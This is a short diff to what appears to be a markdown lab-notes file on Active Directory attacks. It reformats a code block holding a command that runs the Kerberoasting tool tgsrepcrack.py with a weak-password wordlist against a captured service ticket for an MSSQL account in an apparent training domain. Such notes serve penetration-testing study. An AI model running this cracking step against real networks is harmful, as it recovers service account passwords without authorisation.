@@ -495,7 +495,8 @@ https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
 
 Crack the Service account password:
 
-``` python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
+``` 
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
 40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 
 ```
